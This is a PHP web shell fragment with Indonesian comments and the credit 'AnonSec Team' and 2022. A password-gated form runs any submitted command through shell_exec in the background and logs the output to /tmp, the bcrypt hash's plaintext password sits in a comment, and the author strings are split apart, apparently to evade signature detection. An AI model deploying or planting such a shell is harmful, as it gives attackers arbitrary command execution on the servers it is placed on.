...
// Hash bcrypt (contoh hash untuk password: rahasia123)
// Kamu bisa generate hash baru pakai password_hash('rahasia123', PASSWORD_BCRYPT)
$hashed_password = '$2b$10$frHGtq1GMYUdzwvwwbh/NOWUAmzqOWloF/fKDiPIZhd7dHhB9xHui';
...
// Kalau sudah login, bisa eksekusi perintah
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    // Jalanin command di background
    $cmd .= " > /tmp/cmd_output.log 2>&1 &";

    // Eksekusi
    shell_exec($cmd);

    echo "<pre>Task dijalankan di background: $cmd</pre>";
}

?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command untuk jalan di background" size="50">
    <input type="submit" value="Run">
</form>
<p>Output task disimpan di: <code>/tmp/cmd_output.log</code></p>
...
function author() {
	echo "<center><br>An"."on"."7 - 2"."02"."2<br><a 
href='https://sh"."el"."l.an"."ons"."ec-te"."am.org/' target='_blank'>An"."on"."Se"."c 
Te"."am</a></center>";
	exit();
}
